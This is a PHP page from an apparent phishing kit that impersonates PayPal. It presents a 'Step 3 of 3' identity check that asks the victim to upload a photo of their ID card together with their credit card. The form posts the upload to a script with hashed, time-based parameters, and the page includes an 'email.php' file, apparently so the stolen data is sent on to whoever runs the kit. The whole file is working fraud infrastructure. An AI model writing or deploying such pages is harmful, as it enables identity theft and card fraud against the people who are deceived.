<?php 
ob_start();
session_start();
include '../email.php';
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title> Verify identity </title>
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
            <div class="contain">
                <div class="img-logo">
                    <a href="#"><img src="../img/paypal-logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"><a href="#" class="log_out">Log Out</a></div>
                <div class="cls"></div>
            </div>
            <div class="contain biling-p vefic">
                <form method="POST" enctype="multipart/form-data" action="<?php echo 'serv5204.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
                    <center>
                        <span class="step"> (Step 3 of 3)</span>
                        <h3>Confirm your identity</h3>
                    </center>
                    <p style="font-size:16px;color:#012169">Your identification documents will help us to validate your identity.</p>
                    <p style="font-size:14px;color:#2d2d2d;font-weight:bold">What i should to do, to confirm my identity?</p>
                    <ul>
                       <li>Take a picture with your ID card and credit card also</li> 
                       <li>Cardholder Name and ID Card should match and be clearly visible.</li>
                    </ul>
                    <p style="font-size:14px;color:#2d2d2d;font-weight:bold">Here's an example for picture :</p>
                    <img src="../img/id.jpg" style="width:390px">
                    <center>
                        <input type="file" style="padding:7px" name="photo" id="Dobt" class="bill_input" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                    </center>
                    <center>
                        <input type="submit" value="Finish" class="bill_input btn-bill">
                    </center>
                </form>
            </div>
            <div class="foot-pay">
                <center>
                    <a href="#">Contact Us</a>
                    <a href="#">Privacy</a>
                    <a href="#">Legal</a>
                    <a href="#">Worldwide</a>                
                </center>            
            </div>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
?>